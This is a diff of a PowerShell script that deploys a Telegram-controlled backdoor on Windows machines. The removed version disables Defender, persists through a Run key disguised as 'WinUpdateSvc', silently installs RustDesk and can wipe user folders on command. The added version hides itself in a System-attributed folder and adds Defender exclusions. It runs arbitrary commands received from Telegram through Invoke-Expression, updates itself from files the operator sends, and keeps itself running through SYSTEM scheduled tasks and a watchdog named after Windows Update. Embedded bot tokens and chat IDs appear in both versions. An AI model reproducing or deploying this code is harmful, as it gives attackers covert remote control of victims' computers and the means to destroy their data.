@@ -1,308 +1,375 @@
-# Set execution policy to allow scripts
-Set-ExecutionPolicy Bypass -Scope Process -Force
-
+# Run this on target machine to deploy the bot (as Administrator)
 # ============================================================
-# COMPATIBILITY BLOCK for original Starter.bat
-# Starter.bat runs:  powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_PATH%"
-# with NO -WindowStyle Hidden and a `pause` after. We must:
-#   1) Re-launch ourselves detached & hidden so the parent console
-#      returns immediately (Starter.bat's `pause` still works).
-#   2) Survive after the parent console window is closed.
-#   3) Keep running even if Defender re-enables.
+#  M01.ps1 - Persistent Telegram Bot Deployer
+#  Installs to: C:\Program Files\Catalogs\  (hidden)
+#  Adds Defender exclusion for that path
+#  Ensures ONLY ONE bot instance runs at any time
 # ============================================================
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-if (-not $env:BOT_DETACHED) {
-    $env:BOT_DETACHED = "1"
+$installDir  = "$env:ProgramFiles\Catalogs"
+$installPath = "$installDir\sys_tg.ps1"
+$watchdogPath = "$installDir\sys_tg_watchdog.ps1"
+$logPath     = "$installDir\bot.log"
 
-    # Make sure the current script path is absolute & valid
-    $selfPath = $MyInvocation.MyCommand.Path
-    if (-not $selfPath -or -not (Test-Path $selfPath)) {
-        # Fallback: copy ourselves to a stable location, then relaunch from there
-        $stableDir = "C:\Program Files\WindowUpdate"
-        if (-not (Test-Path $stableDir)) { New-Item -ItemType Directory -Path $stableDir -Force | Out-Null }
-        $stablePath = Join-Path $stableDir "M01.ps1"
-        Copy-Item -Path $PSCommandPath -Destination $stablePath -Force
-        $selfPath = $stablePath
-    }
-
-    # Spawn detached, hidden child with env var set so it does NOT re-spawn
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName        = "powershell.exe"
-    $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
-    $psi.UseShellExecute = $false
-    $psi.CreateNoWindow  = $true
-    $psi.EnvironmentVariables["BOT_DETACHED"] = "1"
-
-    # If we're already elevated (Starter.bat self-elevated), the child inherits it.
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
-
-    # Return immediately so Starter.bat reaches its `pause`
+# ===== Ensure we're elevated (needed to write to Program Files & add exclusions) =====
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
-# ============================================================
-# END COMPATIBILITY BLOCK
-# ============================================================
 
-# --- Best-effort: re-disable Defender in case it came back on ---
+# ===== Create hidden install folder in Program Files =====
+if (-not (Test-Path $installDir)) {
+    New-Item -Path $installDir -ItemType Directory -Force | Out-Null
+}
+# Mark folder as Hidden + System
+$folderItem = Get-Item $installDir -Force
+$folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+
+# ===== Add Windows Defender exclusion for install folder =====
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring   $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning       $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection       $true -ErrorAction SilentlyContinue
-    Add-MpPreference   -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
-    Add-MpPreference   -ExclusionPath "C:\Program Files\WindowUpdate" -ErrorAction SilentlyContinue
-} catch { }
-
-# Telegram Bot Configuration
-$botToken = "9290744230:AAFlnBTcGaflxn3eVemSXPsMAFwrxGg9VSI"
-$chatId = "7303070402"
-$lastUpdateId = 0
-
-# Configuration
-$workerFilePath = "C:\Program Files\WindowUpdate\worker_id.txt"
-$logFile        = "C:\Program Files\WindowUpdate\miner_log.txt"
-$tempPath       = "C:\Users\$env:USERNAME\Downloads\temp\"
-
-# RustDesk Configuration
-$rustDeskUrl = "https://github.com/rustdesk/rustdesk/releases/download/1.2.3-2/rustdesk-1.2.3-2-x86_64.exe"
-$rustDeskExe = "$tempPath\rustdesk-setup.exe"
-
-# Ensure directories exist
-if (-not (Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }
-$wuDir = "C:\Program Files\WindowUpdate"
-if (-not (Test-Path $wuDir)) { New-Item -ItemType Directory -Path $wuDir -Force | Out-Null }
-
-# Ensure workerFilePath is valid
-if ($workerFilePath -and (Test-Path $workerFilePath)) {
-    $workerID = Get-Content $workerFilePath | Select-Object -First 1
-    if (-not $workerID) { $workerID = $env:COMPUTERNAME }
-} else {
-    $workerID = $env:COMPUTERNAME
+    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
+    Write-Host "[+] Defender exclusion added for $installDir" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Could not add Defender exclusion: $_" -ForegroundColor Yellow
 }
 
-Write-Host "DEBUG: Worker File Path: $workerFilePath"
-Write-Host "DEBUG: Worker ID Detected: $workerID"
-
-# Persistence so the bot returns after reboot (HKCU Run key, no admin needed)
-try {
-    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $stablePath = "C:\Program Files\WindowUpdate\M01.ps1"
-    # Ensure a stable copy exists for the Run key to point at
-    if (-not (Test-Path $stablePath)) {
-        Copy-Item -Path $PSCommandPath -Destination $stablePath -Force -ErrorAction SilentlyContinue
-    }
-    if (Test-Path $stablePath) {
-        $runCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$stablePath`""
-        Set-ItemProperty -Path $runKey -Name "WinUpdateSvc" -Value $runCmd -Force -ErrorAction SilentlyContinue
-    }
-} catch { }
-
-# Function to log messages
-function Write-Log {
-    param ($message)
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$timestamp - [$workerID] - $message" | Out-File -Append -FilePath $logFile -ErrorAction SilentlyContinue
+# =====================================================================
+# ===== BOT SCRIPT (runs from C:\Program Files\Catalogs\sys_tg.ps1) ==
+# =====================================================================
+$script = @'
+# ===== AUTO ELEVATE =====
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
 
-# Function to send Telegram messages
-function Send-TelegramMessage {
-    param ($message)
-    $url = "https://api.telegram.org/bot$botToken/sendMessage"
-    $body = @{ chat_id = $chatId; text = "[$workerID] $message" } | ConvertTo-Json -Compress
-    try {
-        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
-        Write-Log "Sent message: $message"
-    } catch {
-        Write-Log "Failed to send Telegram message: $_"
-    }
+# ===== CONFIG =====
+$BOT_TOKEN = "8819037627:AAHgm5mlUfhDfdEgbWoMNZoD5alWCve8LY0"
+$CHAT_ID   = "380330092"
+
+$lastUpdate = 0
+$updateMode = $false
+$computerName = $env:COMPUTERNAME
+$script:processedCommands = @{}
+
+# ===== SINGLE-INSTANCE MUTEX =====
+$mutex = New-Object System.Threading.Mutex($false, "Global\TGBot_$computerName")
+if (-not $mutex.WaitOne(0, $false)) {
+    Write-Host "Another instance is already running. Exiting."
+    exit
 }
 
-# ============================================================
-# /rustdesk -> install RustDesk silently and report its ID
-# ============================================================
-function Install-RustDesk {
-    Write-Log "Starting RustDesk installation"
-    Send-TelegramMessage "Starting RustDesk installation..."
-    try {
-        if (-not (Test-Path $rustDeskExe)) {
-            Write-Log "Downloading RustDesk from $rustDeskUrl"
-            Invoke-WebRequest -Uri $rustDeskUrl -OutFile $rustDeskExe -UseBasicParsing -ErrorAction Stop
+# ===== NETWORK WAIT =====
+function Wait-ForNetwork {
+    $attempts = 0
+    while ($attempts -lt 12) {
+        try {
+            $null = Invoke-RestMethod -Uri "https://api.telegram.org" -TimeoutSec 5
+            return $true
+        } catch {
+            $attempts++
+            Start-Sleep -Seconds 5
         }
-        Write-Log "Running silent install"
-        Start-Process -FilePath $rustDeskExe -ArgumentList '/S' -Wait -ErrorAction Stop
+    }
+    return $false
+}
 
-        Start-Sleep -Seconds 8
+if (-not (Wait-ForNetwork)) {
+    Write-Host "Network not available, exiting"
+    $mutex.ReleaseMutex()
+    exit
+}
 
-        $rdPaths = @(
-            "${env:ProgramFiles}\RustDesk\RustDesk.exe",
-            "${env:ProgramFiles(x86)}\RustDesk\RustDesk.exe",
-            "$env:LOCALAPPDATA\Programs\RustDesk\RustDesk.exe"
-        )
-        $rdExe = $rdPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-        if (-not $rdExe) {
-            Send-TelegramMessage "ERROR: RustDesk.exe not found after install"
-            Write-Log "ERROR: RustDesk.exe not found after install"
+function Send($text, $replyToMessageId = $null) {
+    $body = @{
+        chat_id = $CHAT_ID
+        text = "[$computerName]`n$text"
+    }
+    if ($replyToMessageId) { $body.reply_to_message_id = $replyToMessageId }
+
+    $retry = 0
+    do {
+        try {
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Method Post -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
             return
+        } catch {
+            $retry++
+            if ($retry -lt 3) { Start-Sleep -Seconds 2 }
         }
-
-        $idOutput = & $rdExe --get-id 2>$null
-        $rustDeskId = ($idOutput | Out-String).Trim()
-
-        if ([string]::IsNullOrWhiteSpace($rustDeskId)) {
-            $cfgPaths = @(
-                "$env:APPDATA\RustDesk\config\RustDesk.toml",
-                "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml",
-                "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml"
-            )
-            foreach ($cfg in $cfgPaths) {
-                if (Test-Path $cfg) {
-                    $line = Get-Content $cfg | Where-Object { $_ -match '^\s*id\s*=' } | Select-Object -First 1
-                    if ($line) { $rustDeskId = ($line -split '=', 2)[1].Trim().Trim('"'); break }
-                }
-            }
-        }
-
-        if ([string]::IsNullOrWhiteSpace($rustDeskId)) {
-            Send-TelegramMessage "RustDesk installed but ID could not be read"
-            Write-Log "RustDesk installed but ID not found"
-        } else {
-            Send-TelegramMessage "RustDesk installed. ID: $rustDeskId"
-            Write-Log "RustDesk installed. ID: $rustDeskId"
-        }
-    } catch {
-        Send-TelegramMessage "Failed to install RustDesk: $_"
-        Write-Log "Failed to install RustDesk: $_"
-    }
+    } while ($retry -lt 3)
 }
 
-# ============================================================
-# /uninstall -> full RustDesk removal (your exact block)
-# ============================================================
-function Uninstall-RustDesk {
-    Write-Log "Starting RustDesk uninstall"
-    Send-TelegramMessage "Starting RustDesk uninstall..."
-
-    $job = Start-Job -ScriptBlock {
-        taskkill /F /IM RustDesk.exe /T 2>$null
-        sc.exe stop rustdesk 2>$null
-        sc.exe delete rustdesk 2>$null
-        $uninstallPaths = @(
-            "${env:ProgramFiles}\RustDesk\uninstall.exe",
-            "${env:ProgramFiles(x86)}\RustDesk\uninstall.exe",
-            "$env:LOCALAPPDATA\Programs\RustDesk\uninstall.exe",
-            "$env:APPDATA\RustDesk\uninstall.exe"
-        )
-        $uninstaller = $uninstallPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-        if ($uninstaller) {
-            Start-Process $uninstaller -ArgumentList '/S' -Wait
-        }
-    }
-
-    $completed = Wait-Job $job -Timeout 60
-    if (-not $completed) {
-        Write-Log "Uninstall job timed out after 60s"
-        Send-TelegramMessage "RustDesk uninstall timed out (may still be running)"
-    } else {
-        Remove-Job $job -Force
-        Send-TelegramMessage "RustDesk uninstalled successfully"
-        Write-Log "RustDesk uninstalled successfully"
-    }
-}
-
-# ============================================================
-# /clear -> wipe user folders + temp + recycle bin (your exact block)
-# ============================================================
-function Clear-AllData {
-    Write-Log "Starting data wipe"
-    Send-TelegramMessage "Starting data wipe..."
+function GetUpdates {
     try {
-        $e = @(
-            'This PC.lnk',
-            'Recycle Bin.lnk',
-            'Microsoft Edge.lnk',
-            'Google Chrome.lnk',
-            'WPS PDF.lnk',
-            'WPS Office.lnk',
-            'Safe Exam Browser.lnk'
-        )
-        Get-ChildItem 'C:\Users' -Directory |
-            Where-Object {
-                $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') -and
-                (Test-Path "$($_.FullName)\Desktop")
-            } |
-            ForEach-Object {
-                foreach ($f in @('Desktop', 'Downloads', 'Pictures', 'Documents', 'Videos')) {
-                    $p = Join-Path $_.FullName $f
-                    if (Test-Path $p) {
-                        Get-ChildItem $p -Force |
-                            Where-Object { -not ($f -eq 'Desktop' -and $_.Name -in $e) } |
-                            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-        Get-ChildItem $env:TEMP, 'C:\Windows\Temp' -Force -ErrorAction SilentlyContinue |
-            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-        Send-TelegramMessage "Data wipe complete"
-        Write-Log "Data wipe complete"
-    } catch {
-        Send-TelegramMessage "Data wipe failed: $_"
-        Write-Log "Data wipe failed: $_"
-    }
+        return Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdate&timeout=25" -TimeoutSec 30
+    } catch { return $null }
 }
 
-# ============================================================
-# Main loop to listen for Telegram commands
-# ============================================================
+function DownloadFile($file_id, $savePath) {
+    try {
+        $file = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$file_id"
+        $url  = "https://api.telegram.org/file/bot$BOT_TOKEN/$($file.result.file_path)"
+        Invoke-WebRequest $url -OutFile $savePath
+        return $true
+    } catch { return $false }
+}
+
+function IsCommandForMe($commandText) {
+    if ($commandText -match "^@(\S+)\s+(.+)$") {
+        $target = $matches[1]
+        $cmd    = $matches[2]
+        if ($target -eq $computerName -or $target -in @("all","broadcast","everyone")) { return $cmd }
+        return $null
+    }
+    return $commandText
+}
+
+function IsCommandProcessed($messageId, $commandText) {
+    $key = "$messageId`_$commandText"
+    if ($script:processedCommands.ContainsKey($key)) { return $true }
+    $script:processedCommands[$key] = $true
+    if ($script:processedCommands.Count -gt 100) {
+        $script:processedCommands.Keys | Select-Object -First 50 | ForEach-Object { $script:processedCommands.Remove($_) }
+    }
+    return $false
+}
+
+function Set-PowerShellPolicy {
+    try {
+        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
+        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+        try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue } catch {}
+        $env:POWERSHELL_TELEMETRY_OPTOUT = 1
+        $env:POWERSHELL_UPDATECHECK = 'Off'
+        $PSDefaultParameterValues['*:Confirm'] = $false
+        $PSDefaultParameterValues['*:Force']   = $true
+    } catch {}
+}
+Set-PowerShellPolicy
+
+Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
+Send "Bot started on $computerName"
+
+$consecutiveErrors = 0
+
 while ($true) {
-    $updatesUrl = "https://api.telegram.org/bot$botToken/getUpdates?offset=$lastUpdateId"
     try {
-        $updates = Invoke-RestMethod -Uri $updatesUrl -ErrorAction SilentlyContinue
-    } catch {
-        $updates = $null
-    }
+        $updates = GetUpdates
 
-    if ($updates.result) {
-        foreach ($update in $updates.result) {
-            $message  = $update.message.text
-            $updateId = $update.update_id
+        if ($updates -and $updates.result) {
+            $consecutiveErrors = 0
 
-            if ($updateId -gt $lastUpdateId) {
-                $lastUpdateId = $updateId
-                Write-Log "Received command: $message"
-                Write-Host "Received command: $message"
+            foreach ($u in $updates.result) {
+                $lastUpdate = $u.update_id + 1
+                if ($u.message.chat.id -ne $CHAT_ID) { continue }
+                $messageId = $u.message.message_id
 
-                # Broadcast commands (run on every machine)
-                if ($message -eq "/rustdesk") {
-                    Install-RustDesk
-                }
-                elseif ($message -eq "/uninstall") {
-                    Uninstall-RustDesk
-                }
-                elseif ($message -eq "/clear") {
-                    Clear-AllData
+                # ===== COMMAND =====
+                if ($u.message.text) {
+                    $actualCommand = IsCommandForMe $u.message.text
+                    if ($null -eq $actualCommand) { continue }
+                    if (IsCommandProcessed $messageId $actualCommand) { continue }
+
+                    if ($actualCommand -eq "/update") {
+                        $updateMode = $true
+                        Send "Update mode activated. Send new .ps1 file." $messageId
+                        continue
+                    }
+                    if ($actualCommand -eq "/status") {
+                        $uptime = (Get-Date) - (Get-Process -Id $PID).StartTime
+                        $os = (Get-CimInstance Win32_OperatingSystem).Caption
+                        $status = "Status Report`nComputer: $computerName`nOS: $os`nUptime: $($uptime.ToString('hh\h mm\m ss\s'))`nProcesses: $((Get-Process).Count)`nMemory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB,2)) MB"
+                        Send $status $messageId
+                        continue
+                    }
+                    if ($actualCommand -eq "/test") { Send "Test OK - $computerName alive`n$(Get-Date -Format 'HH:mm:ss')" $messageId; continue }
+                    if ($actualCommand -eq "/ping") { Send "Pong from $computerName" $messageId; continue }
+                    if ($actualCommand -eq "/who")  { Send "Current user: $(whoami 2>&1 | Out-String)" $messageId; continue }
+
+                    Send "Executing command..." $messageId
+                    try {
+                        $out = & { $ErrorActionPreference = 'Continue'; Invoke-Expression $actualCommand 2>&1 } | Out-String -Width 4096
+                        if ([string]::IsNullOrWhiteSpace($out)) { $out = "Command executed successfully (no output)" }
+                    } catch { $out = "Error: $($_.Exception.Message)" }
+
+                    $maxLength = 3800
+                    if ($out.Length -gt $maxLength) { $out = $out.Substring(0,$maxLength) + "`n... (truncated)" }
+                    Send $out $messageId
                 }
 
-                # Targeted variants: /rustdesk <worker|all>
-                elseif ($message -match "^/rustdesk\s+(\S+)$") {
-                    $target = $matches[1]
-                    if ($target -eq "all" -or $target -eq $workerID) { Install-RustDesk }
-                    else { Write-Log "Ignored /rustdesk: target '$target' != workerID '$workerID'" }
-                }
-                elseif ($message -match "^/uninstall\s+(\S+)$") {
-                    $target = $matches[1]
-                    if ($target -eq "all" -or $target -eq $workerID) { Uninstall-RustDesk }
-                    else { Write-Log "Ignored /uninstall: target '$target' != workerID '$workerID'" }
-                }
-                elseif ($message -match "^/clear\s+(\S+)$") {
-                    $target = $matches[1]
-                    if ($target -eq "all" -or $target -eq $workerID) { Clear-AllData }
-                    else { Write-Log "Ignored /clear: target '$target' != workerID '$workerID'" }
+                # ===== UPDATE =====
+                if ($updateMode -and $u.message.document) {
+                    $fileName = $u.message.document.file_name
+                    if ($fileName -like "*.ps1") {
+                        $newPath = "$env:TEMP\update_$([Guid]::NewGuid()).ps1"
+                        if (DownloadFile $u.message.document.file_id $newPath) {
+                            Send "Updating $computerName..." $messageId
+                            Copy-Item $PSCommandPath "$PSCommandPath.backup" -Force -ErrorAction SilentlyContinue
+                            Copy-Item $newPath $PSCommandPath -Force
+                            Remove-Item $newPath -Force -ErrorAction SilentlyContinue
+                            Send "$computerName updated. Restarting..." $messageId
+                            Start-Sleep 2
+                            $mutex.ReleaseMutex()
+                            Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+                            exit
+                        } else { Send "Failed to download file" $messageId }
+                    } else { Send "Please send a .ps1 file" $messageId }
+                    $updateMode = $false
                 }
             }
         }
+    } catch {
+        $consecutiveErrors++
+        Write-Host "Error in main loop: $_"
+        Start-Sleep (if ($consecutiveErrors -gt 5) { 30 } else { 10 })
     }
 
-    Start-Sleep -Seconds 5
+    Start-Sleep (Get-Random -Minimum 1 -Maximum 3)
 }
+
+$mutex.ReleaseMutex()
+'@
+
+# Save bot script (also mark file hidden)
+Set-Content -Path $installPath -Value $script -Force
+(Get-Item $installPath -Force).Attributes = 'Hidden','System'
+
+# =====================================================================
+# ===== KILL ALL EXISTING BOT INSTANCES (clean slate) ================
+# =====================================================================
+Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { $_.CommandLine -like "*sys_tg.ps1*" } |
+    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+
+Start-Sleep -Seconds 2
+
+# =====================================================================
+# ===== WATCHDOG SCRIPT (ensures only one instance + restarts if dead) =
+# =====================================================================
+$watchdogScript = @"
+# Watchdog: ensures the bot is running (exactly one instance)
+`$botFile = "$installPath"
+
+# Count running bot instances
+`$instances = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { `$_.CommandLine -like "*sys_tg.ps1*" })
+
+if (`$instances.Count -eq 0) {
+    # No bot running — start it hidden, elevated (Task Scheduler runs as SYSTEM anyway)
+    Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`$botFile`"" -WindowStyle Hidden
+}
+elseif (`$instances.Count -gt 1) {
+    # More than one — kill all but the newest
+    `$sorted = `$instances | Sort-Object CreationDate -Descending
+    `$sorted | Select-Object -Skip 1 | ForEach-Object {
+        Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+}
+"@
+
+Set-Content -Path $watchdogPath -Value $watchdogScript -Force
+(Get-Item $watchdogPath -Force).Attributes = 'Hidden','System'
+
+# =====================================================================
+# ===== SCHEDULED TASKS (persistent, infinite, single-instance) ======
+# =====================================================================
+
+$taskPath = "\WindowUpdate\"
+
+# --- Action for bot task ---
+$action = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""
+
+# --- Action for watchdog task ---
+$watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""
+
+# --- Settings: infinite run, restart on failure, ignore duplicate launches ---
+$settings = New-ScheduledTaskSettingsSet `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -StartWhenAvailable `
+    -RestartInterval (New-TimeSpan -Minutes 1) `
+    -RestartCount 999 `
+    -ExecutionTimeLimit (New-TimeSpan -Days 0) `
+    -MultipleInstances IgnoreNew `
+    -DontStopOnIdleEnd `
+    -Priority 4
+
+# --- Watchdog settings: short-lived check every 2 min ---
+$watchdogSettings = New-ScheduledTaskSettingsSet `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -StartWhenAvailable `
+    -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
+    -MultipleInstances IgnoreNew
+
+# --- Trigger 1: At startup ---
+$triggerStartup = New-ScheduledTaskTrigger -AtStartup
+$triggerStartup.Delay = "PT30S"
+
+# --- Trigger 2: At any user logon ---
+$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
+
+# --- Trigger 3: Repeat every 15 min forever ---
+$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
+    -RepetitionInterval (New-TimeSpan -Minutes 15) `
+    -RepetitionDuration (New-TimeSpan -Days 3650)
+
+# --- Principal: SYSTEM, highest ---
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+# --- Register main task (single task, 3 triggers) ---
+Register-ScheduledTask `
+    -TaskName "WindowUpdate1" `
+    -TaskPath $taskPath `
+    -Action $action `
+    -Trigger @($triggerStartup,$triggerLogon,$triggerRepeat) `
+    -Settings $settings `
+    -Principal $principal `
+    -Description "Runs Telegram bot. Infinite runtime. Single instance enforced by mutex." `
+    -Force | Out-Null
+
+# --- Watchdog trigger: every 2 min, forever ---
+$watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
+    -RepetitionInterval (New-TimeSpan -Minutes 2) `
+    -RepetitionDuration (New-TimeSpan -Days 3650)
+
+# --- Register watchdog task ---
+Register-ScheduledTask `
+    -TaskName "WindowUpdate_Watchdog" `
+    -TaskPath $taskPath `
+    -Action $watchdogAction `
+    -Trigger $watchdogTrigger `
+    -Settings $watchdogSettings `
+    -Principal $principal `
+    -Description "Watchdog: starts bot if not running; kills duplicates." `
+    -Force | Out-Null
+
+# =====================================================================
+# ===== START NOW =====================================================
+# =====================================================================
+
+# Start the bot immediately (one instance)
+Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -WindowStyle Hidden
+
+# Also trigger the scheduled tasks
+Start-ScheduledTask -TaskName "WindowUpdate1" -TaskPath $taskPath -ErrorAction SilentlyContinue
+Start-ScheduledTask -TaskName "WindowUpdate_Watchdog" -TaskPath $taskPath -ErrorAction SilentlyContinue
+
+# =====================================================================
+# ===== SUMMARY =======================================================
+# =====================================================================
+Write-Host "==========================================" -ForegroundColor Green
+Write-Host " Bot deployed on $env:COMPUTERNAME" -ForegroundColor Green
+Write-Host " Install dir : $installDir (Hidden+System)" -ForegroundColor Green
+Write-Host " Bot script  : $installPath" -ForegroundColor Green
+Write-Host " Watchdog    : $watchdogPath" -ForegroundColor Green
+Write-Host " Defender    : $installDir excluded" -ForegroundColor Green
+Write-Host " Tasks       : \WindowUpdate\WindowUpdate1" -ForegroundColor Green
+Write-Host "               \WindowUpdate\WindowUpdate_Watchdog" -ForegroundColor Green
+Write-Host " Runtime     : INFINITE (no ExecutionTimeLimit)" -ForegroundColor Green
+Write-Host " Instances   : enforced single via Global Mutex" -ForegroundColor Green
+Write-Host "==========================================" -ForegroundColor Green
